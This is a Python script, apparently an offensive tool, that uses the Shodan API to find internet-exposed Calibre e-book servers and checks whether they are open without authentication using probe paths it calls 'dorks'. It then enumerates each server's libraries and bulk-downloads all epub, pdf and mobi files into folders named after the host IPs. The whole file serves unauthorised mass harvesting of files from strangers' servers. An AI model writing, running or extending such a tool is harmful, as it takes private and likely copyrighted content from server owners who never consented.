import requests
import shodan
from bs4 import BeautifulSoup
import re
import os
import wget


class CalibreDump:
    def __init__(self, shodan_key):
        self.api = shodan.Shodan(shodan_key)
        self.hosts = []

    def find_calibre_hosts(self):
        try:
            results = self.api.search('calibre')

            for result in results['matches']:
                self.hosts.append(f"{result['ip_str']}:{result['port']}")

        except shodan.APIError as e:
            print(f'Error {e}')

    @staticmethod
    def check_open(ip_port):
        dorks = ['/interface-data/init', '/browse/categories/allbooks']
        for dork in dorks:
            request = requests.get(f'http://{ip_port}{dork}')
            if request.status_code == 200:
                return True
        return False

    @staticmethod
    def get_libraries(ip_port):
        libraries = []

        request = requests.get(f'http://{ip_port}/mobile')
        soap = BeautifulSoup(request.text, features='html.parser')

        library_div = soap.find('div', attrs={'id': 'choose_library'})
        results = library_div.find_all_next('option')

        for result in results:
            library = str(result.text).replace(' ', '_')
            libraries.append(library)

        return libraries

    @staticmethod
    def get_total_books(ip_port, library_name):
        request = requests.get(f'http://{ip_port}/mobile?library_id={library_name}')
        soap = BeautifulSoup(request.text, features='html.parser')

        span_tags = soap.findAll('span')

        for span in span_tags:
            if re.search('Books \\d+ to \\d+ of \\d+', span.text):
                return str(span.text).split('of')[1].strip()

    @staticmethod
    def download_books(ip_port, library_name, max=None):
        download_links = CalibreDump.get_books_link(ip_port, library_name, 25, max)

        directory_ip = str(ip_port).split(':')[0]
        directory_name = f'{directory_ip}-{library_name}'

        try:
            os.mkdir(f'./{directory_name}')
        except FileExistsError:
            print()

        for link in download_links:
            try:
                wget.download(link, directory_name)
            except:
                continue

    @staticmethod
    def get_books_link(ip_port, library_name, multiple, max=None):
        n_books = int(CalibreDump.get_total_books(ip_port, library_name))

        if max is None:
            difference_next_multiple = multiple - (n_books % multiple)
            if difference_next_multiple == multiple:
                difference_next_multiple = 0
            major_number_it = (n_books + difference_next_multiple) // 25
        else:
            difference_next_multiple = multiple - (max % multiple)
            if difference_next_multiple == multiple:
                difference_next_multiple = 0
            major_number_it = (max + difference_next_multiple) // 25

        books_links = []

        for i in range(major_number_it):
            start = multiple * i + 1
            request = requests.get(
                f'http://{ip_port}/mobile?sort=timestamp&library_id={library_name}&num={n_books}&order=descending&start={start}')
            soap = BeautifulSoup(request.text, features='html.parser')

            links_soap = soap.findAll('a', attrs={'href': re.compile('\\.epub|\\.pdf|\\.mobi')})

            for link in links_soap:
                download_link = f'http://{ip_port}{link.get("href")}'
                books_links.append(download_link)

        return books_links
